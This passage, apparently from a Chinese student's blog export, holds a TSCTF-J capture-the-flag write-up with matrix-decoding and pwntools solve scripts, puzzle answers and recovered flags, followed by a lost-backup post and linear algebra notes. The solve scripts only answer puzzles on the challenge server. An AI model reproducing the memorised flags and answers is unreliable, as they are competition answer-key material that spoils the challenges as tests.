class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>, <span class="number">3048939633932959</span>, <span class="number">1493094620735775</span>, <span class="number">645444380397929</span>, <span class="number">246051730125448</span>), (<span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>, <span class="number">3048939633932959</span>, <span class="number">1493094620735775</span>, <span class="number">645444380397929</span>), (<span class="number">3211273400922785</span>, <span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>, <span class="number">3048939633932959</span>, <span class="number">1493094620735775</span>), (<span class="number">1567845292427678</span>, <span class="number">3211273400922785</span>, <span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>, <span class="number">3048939633932959</span>), (<span class="number">675825051627779</span>, <span class="number">1567845292427678</span>, <span class="number">3211273400922785</span>, <span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>, <span class="number">5496061450506544</span>), (<span class="number">256941216121761</span>, <span class="number">675825051627779</span>, <span class="number">1567845292427678</span>, <span class="number">3211273400922785</span>, <span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>, <span class="number">8737261524593285</span>), (<span class="number">85983656265850</span>, <span class="number">256941216121761</span>, <span class="number">675825051627779</span>, <span class="number">1567845292427678</span>, <span class="number">3211273400922785</span>, <span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>, <span class="number">12225052164881326</span>), (<span class="number">25246547002072</span>, <span class="number">85983656265850</span>, <span class="number">256941216121761</span>, <span class="number">675825051627779</span>, <span class="number">1567845292427678</span>, <span class="number">3211273400922785</span>, <span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>, <span class="number">15007745091938298</span>), (<span class="number">6475115181445</span>, <span class="number">25246547002072</span>, <span class="number">85983656265850</span>, <span class="number">256941216121761</span>, <span class="number">675825051627779</span>, <span class="number">1567845292427678</span>, <span class="number">3211273400922785</span>, <span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>, <span class="number">16093167791691979</span>), (<span class="number">1441882588761</span>, <span class="number">6475115181445</span>, <span class="number">25246547002072</span>, <span class="number">85983656265850</span>, <span class="number">256941216121761</span>, <span class="number">675825051627779</span>, <span class="number">1567845292427678</span>, <span class="number">3211273400922785</span>, <span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>, <span class="number">14983846245991262</span>), (<span class="number">276553463002</span>, <span class="number">1441882588761</span>, <span class="number">6475115181445</span>, <span class="number">25246547002072</span>, <span class="number">85983656265850</span>, <span class="number">256941216121761</span>, <span class="number">675825051627779</span>, <span class="number">1567845292427678</span>, <span class="number">3211273400922785</span>, <span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>, <span class="number">12017330318448939</span>), (<span class="number">45208399259</span>, <span class="number">276553463002</span>, <span class="number">1441882588761</span>, <span class="number">6475115181445</span>, <span class="number">25246547002072</span>, <span class="number">85983656265850</span>, <span class="number">256941216121761</span>, <span class="number">675825051627779</span>, <span class="number">1567845292427678</span>, <span class="number">3211273400922785</span>, <span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>, <span class="number">8215569692544794</span>), (<span class="number">6211025353</span>, <span class="number">45208399259</span>, <span class="number">276553463002</span>, <span class="number">1441882588761</span>, <span class="number">6475115181445</span>, <span class="number">25246547002072</span>, <span class="number">85983656265850</span>, <span class="number">256941216121761</span>, <span class="number">675825051627779</span>, <span class="number">1567845292427678</span>, <span class="number">3211273400922785</span>, <span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>, <span class="number">4721116651789019</span>), (<span class="number">703640920</span>, <span class="number">6211025353</span>, <span class="number">45208399259</span>, <span class="number">276553463002</span>, <span class="number">1441882588761</span>, <span class="number">6475115181445</span>, <span class="number">25246547002072</span>, <span class="number">85983656265850</span>, <span class="number">256941216121761</span>, <span class="number">675825051627779</span>, <span class="number">1567845292427678</span>, <span class="number">3211273400922785</span>, <span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>, <span class="number">2237633715238274</span>), (<span class="number">64001565</span>, <span class="number">703640920</span>, <span class="number">6211025353</span>, <span class="number">45208399259</span>, <span class="number">276553463002</span>, <span class="number">1441882588761</span>, <span class="number">6475115181445</span>, <span class="number">25246547002072</span>, <span class="number">85983656265850</span>, <span class="number">256941216121761</span>, <span class="number">675825051627779</span>, <span class="number">1567845292427678</span>, <span class="number">3211273400922785</span>, <span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>, <span class="number">851727613727076</span>), (<span class="number">4493136</span>, <span class="number">64001565</span>, <span class="number">703640920</span>, <span class="number">6211025353</span>, <span class="number">45208399259</span>, <span class="number">276553463002</span>, <span class="number">1441882588761</span>, <span class="number">6475115181445</span>, <span class="number">25246547002072</span>, <span class="number">85983656265850</span>, <span class="number">256941216121761</span>, <span class="number">675825051627779</span>, <span class="number">1567845292427678</span>, <span class="number">3211273400922785</span>, <span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>, <span class="number">250306467069971</span>), (<span class="number">228536</span>, <span class="number">4493136</span>, <span class="number">64001565</span>, <span class="number">703640920</span>, <span class="number">6211025353</span>, <span class="number">45208399259</span>, <span class="number">276553463002</span>, <span class="number">1441882588761</span>, <span class="number">6475115181445</span>, <span class="number">25246547002072</span>, <span class="number">85983656265850</span>, <span class="number">256941216121761</span>, <span class="number">675825051627779</span>, <span class="number">1567845292427678</span>, <span class="number">3211273400922785</span>, <span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>, <span class="number">53315924941557</span>), (<span class="number">7495</span>, <span class="number">228536</span>, <span class="number">4493136</span>, <span class="number">64001565</span>, <span class="number">703640920</span>, <span class="number">6211025353</span>, <span class="number">45208399259</span>, <span class="number">276553463002</span>, <span class="number">1441882588761</span>, <span class="number">6475115181445</span>, <span class="number">25246547002072</span>, <span class="number">85983656265850</span>, <span class="number">256941216121761</span>, <span class="number">675825051627779</span>, <span class="number">1567845292427678</span>, <span class="number">3211273400922785</span>, <span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>, <span class="number">7325752215524</span>), (<span class="number">119</span>, <span class="number">7495</span>, <span class="number">228536</span>, <span class="number">4493136</span>, <span class="number">64001565</span>, <span class="number">703640920</span>, <span class="number">6211025353</span>, <span class="number">45208399259</span>, <span class="number">276553463002</span>, <span class="number">1441882588761</span>, <span class="number">6475115181445</span>, <span class="number">25246547002072</span>, <span class="number">85983656265850</span>, <span class="number">256941216121761</span>, <span class="number">675825051627779</span>, <span class="number">1567845292427678</span>, <span class="number">3211273400922785</span>, <span class="number">5807175032551549</span>, <span class="number">9262882643940282</span>, <span class="number">13006248197745601</span>, <span class="number">16025832872164445</span>, <span class="number">17251391027812564</span>, <span class="number">16127119276061653</span>, <span class="number">12988691565917518</span>, <span class="number">8918482256116815</span>, <span class="number">5148302163881472</span>, <span class="number">2451555963598877</span>, <span class="number">937671670357353</span>, <span class="number">276935161109092</span>, <span class="number">59288591411038</span>, <span class="number">8188766980601</span>, <span class="number">1035461692406</span>)]</span><br><span class="line">C=Matrix(C)</span><br><span class="line">M=Matrix(<span class="number">32</span>,<span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        M[i,i] = <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">        M[i,i+<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">M = M.transpose()</span><br><span class="line">t=<span class="number">31</span></span><br><span class="line">G=Matrix(<span class="number">32</span>,<span class="number">32</span>)</span><br><span class="line">O=Matrix(<span class="number">32</span>,<span class="number">32</span>)</span><br><span class="line">t=<span class="number">31</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">    a=C[<span class="number">31</span>-i,<span class="number">0</span>]</span><br><span class="line">    G=M**t</span><br><span class="line">    O=a*G</span><br><span class="line">    C-=O</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    t-=<span class="number">1</span></span><br><span class="line">t=<span class="number">31</span></span><br><span class="line">M = M.transpose()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">    a=C[<span class="number">0</span>,<span class="number">31</span>-i]</span><br><span class="line">    G=M**t</span><br><span class="line">    O=a*G</span><br><span class="line">    C-=O</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    t-=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>输出tropmI_si_xirtaM_nadroJ{J_FTCST</p>
<p>再用逆序代码将这串字符逆序即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">strReverse</span>(<span class="params">strDemo</span>):</span><br><span class="line">    <span class="keyword">return</span> strDemo[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(strReverse(<span class="string">&#x27;&#125;tropmI_si_xirtaM_nadroJ&#123;J_FTCST&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p>TSCTF_J{Jordan_Matrix_is_Import}</p>
<h1 id="misc">MISC</h1>
<h2 id="北邮人之声">北邮人之声</h2>
<p>一听就知道是倒放，用AU将其倒过来</p>
<p>然后努力的去听（</p>
<p>听到一串单词，联合搜索 Whiskey等，再敲下出题人（</p>
<p>发现是国际航空无线电通讯</p>
<p>一一对应得到flag</p>
<h2 id="just_play">Just_Play</h2>
<p>小游戏，玩了4h，还挺好玩，顺便问问f0复制黏贴塔的时候不累吗</p>
<h2 id="strange-base64">strange base64</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"> </span><br><span class="line">flag=<span class="string">&quot;TSCTF-J&#123;fake_flag&#125;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GBK2312</span>():</span><br><span class="line">    head = random.randint(<span class="number">0xb0</span>, <span class="number">0xf7</span>)</span><br><span class="line">    body = random.randint(<span class="number">0xa1</span>, <span class="number">0xfe</span>)</span><br><span class="line">    val = <span class="string">f&#x27;<span class="subst">&#123;head:x&#125;</span> <span class="subst">&#123;body:x&#125;</span>&#x27;</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="built_in">bytes</span>.fromhex(val).decode(<span class="string">&#x27;gb2312&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64encode</span>(<span class="params">a</span>):</span><br><span class="line">    encode = base64.b64encode(a.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> encode</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">777</span>):</span><br><span class="line">        choice=random.random()</span><br><span class="line">        <span class="keyword">if</span> choice &lt;= <span class="number">0.3</span>:</span><br><span class="line">            chinese=GBK2312()</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            chinese=<span class="built_in">str</span>(random.choice(dic_word))</span><br><span class="line">        chinese_base64=b64encode(chinese)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Input base64(???) = <span class="subst">&#123;chinese_base64&#125;</span> plz!&#x27;</span>)</span><br><span class="line">        s = <span class="built_in">input</span>()</span><br><span class="line">        <span class="keyword">if</span> s == chinese:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>:succeed&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>:failed&#x27;</span>)</span><br><span class="line">            quit()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>很容易就看出了解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">b64decode</span>(<span class="params">a</span>):</span><br><span class="line">    a=base64.b64decode(a)</span><br><span class="line">    decode=a.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> decode</span><br></pre></td></tr></table></figure>
<p>重点在于这个777循环，需要与服务器进行交互</p>
<p>小小学习下pwntools的使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64decode</span>(<span class="params">a</span>):</span><br><span class="line">    a=base64.b64decode(a)</span><br><span class="line">    decode=a.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> decode</span><br><span class="line">r = remote(<span class="string">&#x27;121.4.73.103&#x27;</span>,<span class="number">10007</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">777</span>):</span><br><span class="line">    a=r.recvline()</span><br><span class="line">    c=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> a[<span class="number">21</span>:]:</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">chr</span>(k)==<span class="string">&quot; &quot;</span>):<span class="keyword">break</span></span><br><span class="line">        c+=<span class="built_in">chr</span>(k)</span><br><span class="line">    c=b64decode(c)</span><br><span class="line">    data = <span class="built_in">bytes</span>(c,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    r.sendline(data)</span><br><span class="line">    r.recvline()</span><br><span class="line"><span class="built_in">print</span>(r.recv())</span><br></pre></td></tr></table></figure>
<p>运行即可解得flag</p>
<h1 id="abstract">Abstract</h1>
<p>由于不是Abstract手，就随便写写</p>
<h2 id="abstract_culture">Abstract_culture</h2>
<p>yesterday——曾经</p>
<p>浪——海浪</p>
<p>today——今日</p>
<p>水滴禁止水滴</p>
<p>山</p>
<p>云静止云</p>
<p>小猜一下+知识储备</p>
<p>得出<strong>曾经沧海难为水，除却巫山不是云</strong></p>
<h2 id="easteregg">EasterEgg</h2>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20221018000800254.png" /></p>
<p>不难看出是helang（何语言）</p>
<p>https://github.com/kifuan/helang</p>
<p>可以看到u8_b是数组，b[1]应该是数组第1个数</p>
<p>因为<strong>Saint He</strong>
曾说：whichKey-1,所以数组下标从1开始</p>
<p>但是由于出题人何语言不过关，所以应该是688333*2</p>
<h2 id="nc-me">nc me</h2>
<p>直接nc进去，ls，然后cat flag即可</p>
]]></content>
      <categories>
        <category>比赛wp</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>Come back!</title>
    <url>/archives/60882abe.html</url>
    <content><![CDATA[<p>发现blog备份压根没备份好，post全不见了，就找到一个去年5月的，寄！</p>
]]></content>
  </entry>
  <entry>
    <title>向量组的线性相关性</title>
    <url>/archives/e59008e8.html</url>
    <content><![CDATA[<p>小明在打geekgame，小美在学no_F5动调,小陈在学Linear
Algebra，他们都有光明的未来（</p>
<p><del>正经人谁打geekgame啊</del></p>
<p>geekgame一道题不会写，只好跑来写写线代的<del>部分总结</del>定理大全了</p>
<span id="more"></span>
<h1 id="n维向量的概念及其线性运算">n维向量的概念及其线性运算</h1>
<h2 id="n维向量的定义定义1">n维向量的定义（定义1）</h2>
<p><span class="math display">\[
由n个数a_1,a_2,...,a_n组成的有序数组\alpha=(a_1,a_2,...,a_n)称为一个n维向量，数a_i称为该向量的第i个分量(i=1,2,...,n)
\]</span></p>
<p>一般指向实向量(分量为实数)</p>
<p>分量是向量在坐标轴上的投影</p>
<p>行向量（1 x n）只有1行，列向量（n x 1）只有1列</p>
<p><strong>向量是一种特殊的矩阵</strong></p>
<p><strong>规定</strong>：所有分量都是零的n维向量称为<strong>n维零向量</strong>。记作<strong>0</strong>，即<strong>0</strong>=(0,0,...,0)</p>
<h2 id="定义2-n维向量的加法">定义2 n维向量的加法</h2>
<p>n维向量的加法</p>
<p>运算规则与矩阵相同</p>
<h2 id="定义3-n维向量的数乘运算">定义3 n维向量的数乘运算</h2>
<p>n维向量的数乘运算</p>
<p>运算规则与矩阵相同</p>
<p><strong>约定：</strong>对于任意实数k以及任意的n维向量<strong>α</strong>，都有k<strong>α</strong>=<strong>α</strong>k</p>
<p>向量的加法运算及数乘运算统称为向量的线性运算。</p>
<h1 id="向量组的线性相关性">向量组的线性相关性</h1>
<h2 id="定义4-线性表出">定义4 线性表出</h2>
<p>设<span
class="math inline">\(\alpha_1,\alpha_2,...,\alpha_m\)</span>是一组n维向量，<span
class="math inline">\(k_1,k_2,...,k_m\)</span>是一组实常数，</p>
<p>则称<span
class="math inline">\(k_1\alpha_1+k_2\alpha_2+\cdots+k_m\alpha_m\)</span>
为 <span
class="math inline">\(\alpha_1,\alpha_2,\cdots,\alpha_m\)</span>
的一个线性组合；</p>
<p>常数<span
class="math inline">\(k_1,k_2,\cdots,k_m\)</span>为该线性组合的组合系数.</p>
<p>若一个n维向量<span
class="math inline">\(\beta\)</span>可以表示称<span
class="math inline">\(\beta=k_1\alpha_1+k_2\alpha_2+...+k_m\alpha_m,\)</span>
则称<span class="math inline">\(\beta\)</span>是<span
class="math inline">\(\alpha_1,\alpha_2,...,\alpha_m\)</span>的<strong>线性组合</strong>，或称<span
class="math inline">\(\beta\)</span>可用<span
class="math inline">\(\alpha_1,\alpha_2,...,\alpha_m\)</span><strong>线性表出</strong>（线性表示)
仍称<span
class="math inline">\(k_1,k_2,...,k_m\)</span>为<strong>组合系数</strong>，或<strong>表出系数</strong></p>
<p>若干个<strong>同维度的向量</strong>所组成的<strong>集合</strong>叫做向量组，m个向量<strong>α₁</strong>,<strong>α₂,</strong>....,<strong>αₘ</strong>
